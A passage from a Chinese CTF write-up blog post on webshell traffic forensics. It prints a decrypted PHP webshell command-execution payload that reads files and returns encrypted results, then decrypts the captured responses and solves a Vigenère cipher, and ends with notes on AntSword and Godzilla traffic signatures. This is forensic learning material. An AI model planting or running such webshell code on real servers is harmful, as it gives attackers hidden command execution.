&#x27;r&#x27;);</span><br><span class="line">        $kWJW = NULL;</span><br><span class="line">        if (is_resource($fp)) &#123;</span><br><span class="line">            while (! feof($fp)) &#123;</span><br><span class="line">                $kWJW .= fread($fp, 1024);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        @pclose($fp);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $kWJW = 0;</span><br><span class="line">        $result[&quot;status&quot;] = base64_encode(&quot;fail&quot;);</span><br><span class="line">        $result[&quot;msg&quot;] = base64_encode(&quot;none of proc_open/passthru/shell_exec/exec/exec is available&quot;);</span><br><span class="line">        $key = $_SESSION[&#x27;k&#x27;];</span><br><span class="line">        echo encrypt(json_encode($result), $key);</span><br><span class="line">        return;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    $result[&quot;status&quot;] = base64_encode(&quot;success&quot;);</span><br><span class="line">    $result[&quot;msg&quot;] = base64_encode(getSafeStr($kWJW));</span><br><span class="line">    echo encrypt(json_encode($result),  $_SESSION[&#x27;k&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function encrypt($data,$key)</span><br><span class="line">&#123;</span><br><span class="line">        if(!extension_loaded(&#x27;openssl&#x27;))</span><br><span class="line">        &#123;</span><br><span class="line">                for($i=0;$i&lt;strlen($data);$i++) &#123;</span><br><span class="line">                         $data[$i] = $data[$i]^$key[$i+1&amp;15];</span><br><span class="line">                        &#125;</span><br><span class="line">                        return $data;</span><br><span class="line">        &#125;</span><br><span class="line">    else</span><br><span class="line">        &#123;</span><br><span class="line">                return openssl_encrypt($data, &quot;AES128&quot;, $key);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;$cmd=&quot;cat GronKey.txt&quot;;</span><br><span class="line">main($cmd);</span><br></pre></td></tr></table></figure>
+
+<p>对应返回包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php decropt.php -k 2295d22e2d70888f -a w5lcFkJ5g/LtCqI0NgGN0nr2fGo9r1/AzKUMpzC878J4hU17Fu2Q89EMiYBl3hWbGAewU7bpnuWx4oBUmohKkg==</span><br></pre></td></tr></table></figure>
+
+<p>解密结果</p>
+<p>$cmd&#x3D;”cat GronKey.txt”;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;status&quot;:&quot;success&quot;,&quot;msg&quot;:&quot;1,50,61,8,9,20,63,41&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>tcp流三</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#125;$cmd=&quot;cat flag.txt&quot;;</span><br><span class="line">main($cmd);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;status&quot;:&quot;success&quot;,&quot;msg&quot;:&quot;TGLBOMSJNSRAJAZDEZXGHSJNZWHG&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>tcp流2</p>
+<p>Vigenere解密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s = [1,50,61,8,9,20,63,41]</span><br><span class="line">import string</span><br><span class="line">dic = string.ascii_lowercase</span><br><span class="line">key = &#x27;&#x27;</span><br><span class="line">for k in s:</span><br><span class="line">    key += dic[k%26]</span><br><span class="line">print(key)</span><br></pre></td></tr></table></figure>
+
+<p>解的维吉尼亚的key </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">def decrypt_string(ciphertext, offsets):</span><br><span class="line">    decrypted_string = &quot;&quot;</span><br><span class="line">    offset_index = 0</span><br><span class="line"></span><br><span class="line">    for char in ciphertext:</span><br><span class="line">        offset = offsets[offset_index] % 26</span><br><span class="line">        decrypted_char_code = (ord(char) - ord(&#x27;A&#x27;) - offset) % 26 + ord(&#x27;A&#x27;)</span><br><span class="line">        decrypted_char = chr(decrypted_char_code)</span><br><span class="line">        decrypted_string += decrypted_char</span><br><span class="line"></span><br><span class="line">        offset_index = (offset_index + 1) % len(offsets)</span><br><span class="line"></span><br><span class="line">    return decrypted_string</span><br><span class="line"></span><br><span class="line">ciphertext = &quot;TGLBOMSJNSRAJAZDEZXGHSJNZWHG&quot;</span><br><span class="line">offsets = [1, 50, 61, 8, 9, 20, 63]</span><br><span class="line">decrypted_string = decrypt_string(ciphertext, offsets)</span><br><span class="line">print(decrypted_string)</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="蚁剑流量"><a href="#蚁剑流量" class="headerlink" title="蚁剑流量"></a>蚁剑流量</h1><p>流量特征</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/UserNick157/article/details/124405353">中国蚁剑流量分析-CSDN博客</a></p>
+<h1 id="哥斯拉"><a href="#哥斯拉" class="headerlink" title="哥斯拉"></a>哥斯拉</h1><p>流量特征</p>
+<p>哥斯拉的作者应该还没有意识到，在请求包的Cookie中有一个非常致命的特征，最后的分号</p>
+<p>通过Burp抓包可知，第1个请求会发送大量数据，该请求不含有任何Cookie信息，服务器响应报文不含任何数据，但是会设置PHPSESSID，后续请求都会自动带上该Cookie</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/sinat_31884905/article/details/132548617">【流量分析】Godzilla分析_哥斯拉流量特征-CSDN博客</a></p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>三天饿九顿，讨点饭吃。</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="https://s3.bmp.ovh/imgs/2024/03/14/21b16ab18c2680bb.png" alt="小zhou 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="https://s3.bmp.ovh/imgs/2024/03/14/d41c13eba802dd0b.png" alt="小zhou 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/misc/" rel="tag"># misc</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/04/01/ctfshow%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="prev" title="ctfshow反序列化">
+      <i class="fa fa-chevron-left"></i> ctfshow反序列化
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2024/04/02/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="next" title="php反序列化">
+      php反序列化 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#cs-%E6%B5%81%E9%87%8F"><span class="nav-number">1.</span> <span class="nav-text">cs 流量</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%B0%E8%9D%8E%E6%B5%81%E9%87%8F"><span class="nav-number">2.</span> <span class="nav-text">冰蝎流量</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F"><span class="nav-number">3.</span> <span class="nav-text">蚁剑流量</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%93%A5%E6%96%AF%E6%8B%89"><span class="nav-number">4.</span> <span class="nav-text">哥斯拉</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="小zhou"
+      src="/images/QQ%E5%9B%BE%E7%89%8720230109005650.jpg">
+  <p class="site-author-name" itemprop="name">小zhou</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">小zhou</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">23k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">1:23</span>
+</div>
+
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
+  </div> -->
+<!-- <br /> -->
+<!-- 网站运行时间的设置 -->
+<span id="timeDate">载入天数...</span>
+<!-- <span id="times">载入时分秒...</span> -->
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("11/17/2022 8:00:00");//此处修改你的建站时间或者网站上线时间
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); 
+        if(String(snum).length ==1 ){snum = "0" + snum;}
+        // var times = document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 "+hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"rect":"opacity:0.7","log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/clicklove.js"></script>
